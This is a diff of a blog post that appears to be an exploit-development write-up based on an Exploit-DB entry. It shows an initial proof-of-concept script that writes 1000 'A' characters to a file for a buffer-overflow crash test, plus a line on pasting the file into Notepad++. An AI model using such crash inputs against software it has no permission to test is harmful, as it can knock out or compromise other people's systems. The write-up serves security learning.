@@ -15,7 +15,7 @@ Today i was gathering around Exploit-DB, when i found [this](https://www.exploit
 
 Initial PoC script:
 
-```
+```term_session
 import struct
 
 buffer = "A" * 1000
@@ -23,3 +23,7 @@ f = open ("strike.txt", "w")
 f.write(buffer)
 f.close()
 ```
+
+Once the exploit is executed with python, it is opened and copied to clipboard with Notepad++:
+
+![](/asset/img/Findings1/0.png)
